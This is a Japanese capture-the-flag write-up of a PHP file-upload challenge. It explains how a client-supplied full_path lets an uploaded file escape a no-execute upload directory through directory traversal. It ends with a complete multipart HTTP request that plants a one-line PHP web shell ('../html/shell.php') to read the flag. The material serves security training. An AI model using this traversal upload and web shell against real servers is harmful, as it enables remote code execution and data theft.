# rate-my-alpaca writeup
<https://alpacahack.com/daily/challenges/rate-my-alpaca>

## 1. 概要
本問題はPHPのファイルアップロード機能の仕様を利用して任意のコード実行を狙うWeb問題です．

## 2. 問題の分析

### ファイル構成
Docker上で動作するPHPアプリケーションです．
uploads.confではアップロード先のディレクトリである/var/www/uploadsでのPHPの実行が禁止されています．

### ソースコードの確認
index.phpではアップロードされたファイルの保存先ファイル名を$_FILES['file']['full_path']から取得しています．
この変数にはブラウザなどのクライアントが送信したパスがそのまま格納されます．

## 3. 脆弱性と攻略方針

### 脆弱性
PHPでサポートされるfull_pathにはディレクトリトラバーサルの脆弱性が生じる可能性があります．

### 攻略方針：
リクエストを送信する際にfilenameの値を../html/shell.phpのように改ざんするとPHPの実行制限がない上位ディレクトリにファイルを配置できます．
配置したスクリプトにアクセスすることで任意のOSコマンドを実行しサーバー上のフラグを読み取ります．

## 4. エクスプロイトコード

```http
POST / HTTP/1.1
Host: <target_host>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2d4SkkzcQlnwtCRx

------WebKitFormBoundary2d4SkkzcQlnwtCRx
Content-Disposition: form-data; name="file"; filename="../html/shell.php"
Content-Type: text/php

<?php system('cat /flag*'); ?>
------WebKitFormBoundary2d4SkkzcQlnwtCRx--
```
上記のリクエストを送信した後にブラウザ等で/shell.phpへアクセスしてフラグを取得します．